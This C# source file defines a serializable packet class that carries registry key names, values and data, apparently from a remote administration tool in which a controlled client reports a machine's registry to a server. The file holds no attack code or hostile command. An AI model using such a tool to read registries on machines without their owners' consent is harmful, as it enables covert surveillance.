using System;
using xServer.Core.Networking;
using xServer.Core.Utilities;

namespace xServer.Core.Packets.ClientPackets
{
    [Serializable]
    public class GetRegistryKeysResponse : IPacket
    {
        public string[] Key { get; set; }

        public string[] Value { get; set; }

        public string[] Data { get; set; }

        public bool IsRootKey { get; set; }

        public GetRegistryKeysResponse()
        { }

        public GetRegistryKeysResponse(string[] key, string[] value, string[] data, bool isRootKey = false)
        {
            Key = key;
            Value = value;
            Data = data;
            IsRootKey = isRootKey;
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}